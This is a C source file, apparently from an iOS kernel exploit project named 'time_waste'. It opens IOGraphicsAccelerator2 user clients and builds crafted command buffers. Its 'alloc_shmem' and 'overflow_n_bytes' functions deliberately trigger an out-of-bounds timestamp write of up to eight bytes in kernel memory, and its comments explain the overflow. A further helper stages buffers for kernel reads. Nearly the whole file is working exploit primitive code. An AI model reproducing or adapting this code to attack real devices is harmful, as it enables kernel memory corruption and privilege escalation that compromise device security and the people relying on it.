//
//  IOAccelerator_stuff.c
//  time_waste
//
//  Created by Jake James on 2/22/20.
//  Copyright © 2020 Jake James. All rights reserved.
//

#import "IOAccelerator_stuff.h"
#include <common.h>

io_connect_t IOAccelCommandQueue2 = IO_OBJECT_NULL;
io_connect_t IOAccelSharedUserClient2 = IO_OBJECT_NULL;
io_service_t IOGraphicsAccelerator2;

kern_return_t IOAccelSharedUserClient2_create_shmem(size_t size, struct IOAccelDeviceShmemData *shmem) {
    size_t out_size = sizeof(*shmem);
    uint64_t shmem_size = size;
    return IOConnectCallMethod(IOAccelSharedUserClient2, IOAccelSharedUserClient2_create_shmem_selector, &shmem_size, 1, NULL, 0, NULL, NULL, shmem, &out_size);
}

kern_return_t IOAccelSharedUserClient2_destroy_shmem(uint32_t shmem_id) {
    uint64_t id = shmem_id;
    return IOConnectCallMethod(IOAccelSharedUserClient2, IOAccelSharedUserClient2_destroy_shmem_selector, &id, 1, NULL, 0, NULL, NULL, NULL, NULL);
}

kern_return_t IOAccelCommandQueue2_set_notification_port(mach_port_t notification_port) {
    return IOConnectCallAsyncMethod(IOAccelCommandQueue2, IOAccelCommandQueue2_set_notification_port_selector, notification_port, NULL, 0, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
}

kern_return_t IOAccelCommandQueue2_submit_command_buffers(const struct IOAccelCommandQueueSubmitArgs_Header *submit_args, size_t size) {
    return IOConnectCallMethod(IOAccelCommandQueue2, IOAccelCommandQueue2_submit_command_buffers_selector, NULL, 0, submit_args, size, NULL, NULL, NULL, NULL);
}

struct {
    struct IOAccelCommandQueueSubmitArgs_Header header;
    struct IOAccelCommandQueueSubmitArgs_Command command;
} submit_args = {};

int alloc_shmem(uint32_t buffer_size, struct IOAccelDeviceShmemData *cmdbuf, struct IOAccelDeviceShmemData *seglist) {
    struct IOAccelDeviceShmemData command_buffer_shmem;
    struct IOAccelDeviceShmemData segment_list_shmem;
    
    kern_return_t kr = IOAccelSharedUserClient2_create_shmem(buffer_size, &command_buffer_shmem);
    if (kr) {
        RAWLOG("[-] IOAccelSharedUserClient2_create_shmem: 0x%x (%s)", kr, mach_error_string(kr));
        return kr;
    }
    
    kr = IOAccelSharedUserClient2_create_shmem(buffer_size, &segment_list_shmem);
    if (kr) {
        RAWLOG("[-] IOAccelSharedUserClient2_create_shmem: 0x%x (%s)", kr, mach_error_string(kr));
        return kr;
    }
    
    *cmdbuf = command_buffer_shmem;
    *seglist = segment_list_shmem;
    
    submit_args.header.count = 1;
    submit_args.command.command_buffer_shmem_id = command_buffer_shmem.shmem_id;
    submit_args.command.segment_list_shmem_id = segment_list_shmem.shmem_id;

    struct IOAccelSegmentListHeader *slh = segment_list_shmem.data;
    slh->length = 0x100;
    slh->segment_count = 1;
    
    struct IOAccelSegmentResourceListHeader *srlh = (void *)(slh + 1);
    srlh->kernel_commands_start_offset = 0;
    srlh->kernel_commands_end_offset = buffer_size;
    
    // this is just a filler for the first 0x4000 - n bytes, timestamp written in off_timestamp = 8
    struct IOAccelKernelCommand_CollectTimeStamp *cmd1 = command_buffer_shmem.data;
    cmd1->command.type = 2;
    cmd1->command.size = (uint32_t)buffer_size - 16;
    
    // put command 2 after command 1, so now timestamp written in cmd1->command.size + off_timestamp (8) = 0x4000 <= 8 bytes written OOB!
    struct IOAccelKernelCommand_CollectTimeStamp *cmd2 = (void *)((uint8_t *)cmd1 + cmd1->command.size);
    cmd2->command.type = 2;
    cmd2->command.size = 8;
    
    return IOAccelCommandQueue2_submit_command_buffers(&submit_args.header, sizeof(submit_args));
}

int overflow_n_bytes(uint32_t buffer_size, int n, struct IOAccelDeviceShmemData *cmdbuf, struct IOAccelDeviceShmemData *seglist) {
    if (n > 8 || n < 0) {
        RAWLOG("[-] Can't overflow: 0 <= n <= 8");
        return -1;
    }
    
    submit_args.header.count = 1;
    submit_args.command.command_buffer_shmem_id = cmdbuf->shmem_id;
    submit_args.command.segment_list_shmem_id = seglist->shmem_id;

    struct IOAccelSegmentListHeader *slh = seglist->data;
    slh->length = 0x100;
    slh->segment_count = 1;
    
    struct IOAccelSegmentResourceListHeader *srlh = (void *)(slh + 1);
    srlh->kernel_commands_start_offset = 0;
    srlh->kernel_commands_end_offset = buffer_size;
    
    // this is just a filler for the first buffer_size - n bytes, timestamp written in off_timestamp = 8
    struct IOAccelKernelCommand_CollectTimeStamp *cmd1 = cmdbuf->data;
    cmd1->command.type = 2;
    cmd1->command.size = (uint32_t)buffer_size - 16 + n;
       
    // put command 2 after command 1, so now timestamp written in cmd1->command.size + off_timestamp (8) = buffer_size - 8 + n <= n bytes written OOB!
    struct IOAccelKernelCommand_CollectTimeStamp *cmd2 = (void *)((uint8_t *)cmd1 + cmd1->command.size);
    cmd2->command.type = 2;
    cmd2->command.size = 8;
    
    return IOAccelCommandQueue2_submit_command_buffers(&submit_args.header, sizeof(submit_args));
}

int make_buffer_readable_by_kernel(void *buffer, uint64_t n_pages) {
    for (int i = 0; i < n_pages * pagesize; i += pagesize) {
        struct IOAccelKernelCommand_CollectTimeStamp *ts_cmd = (struct IOAccelKernelCommand_CollectTimeStamp *)(((uint8_t *)buffer) + i);
        bool end = i == (n_pages * pagesize - pagesize);
        ts_cmd->command.type = 2;
        ts_cmd->command.size = pagesize - (end ? sizeof(struct IOAccelKernelCommand_CollectTimeStamp) : 0);
        
        // we have to write something because... memory stuff
        *(((uint8_t *)buffer) + i) = 0;
    }
    return IOAccelCommandQueue2_submit_command_buffers(&submit_args.header, sizeof(submit_args));
}

int init_IOAccelerator() {
    IOGraphicsAccelerator2 = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOGraphicsAccelerator2"));
    if (!IOGraphicsAccelerator2) {
        RAWLOG("[-] Failed to find IOGraphicsAccelerator2 service");
        return KERN_FAILURE;
    }

    kern_return_t kr = IOServiceOpen(IOGraphicsAccelerator2, mach_task_self(), IOAccelCommandQueue2_type, &IOAccelCommandQueue2);
    if (kr) {
		// iOS 12. should probably move this to offsets.m
		kr = IOServiceOpen(IOGraphicsAccelerator2, mach_task_self(), 5, &IOAccelCommandQueue2);
		if (kr) {
			RAWLOG("[-] Failed to open IOAccelCommandQueue2: 0x%x (%s)", kr, mach_error_string(kr));
			return kr;
		}
    }

    kr = IOServiceOpen(IOGraphicsAccelerator2, mach_task_self(),
            IOAccelSharedUserClient2_type, &IOAccelSharedUserClient2);
    if (kr) {
        RAWLOG("[-] Failed to open IOAccelSharedUserClient2: 0x%x (%s)", kr, mach_error_string(kr));
        return kr;
    }
    
    kr = IOConnectAddClient(IOAccelCommandQueue2, IOAccelSharedUserClient2);
    if (kr) {
        RAWLOG("[-] Failed to connect IOAccelCommandQueue2 to IOAccelSharedUserClient2: 0x%x (%s)", kr, mach_error_string(kr));
        return kr;
    }

    mach_port_t notification_port;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notification_port);
    IOAccelCommandQueue2_set_notification_port(notification_port);
    
    return 0;
}

void term_IOAccelerator() {
    if (IOGraphicsAccelerator2) IOObjectRelease(IOGraphicsAccelerator2);
    if (IOAccelCommandQueue2) IOServiceClose(IOAccelCommandQueue2);
    if (IOAccelSharedUserClient2) IOServiceClose(IOAccelSharedUserClient2);
    
    IOGraphicsAccelerator2 = 0;
    IOAccelCommandQueue2 = 0;
    IOAccelSharedUserClient2 = 0;
}
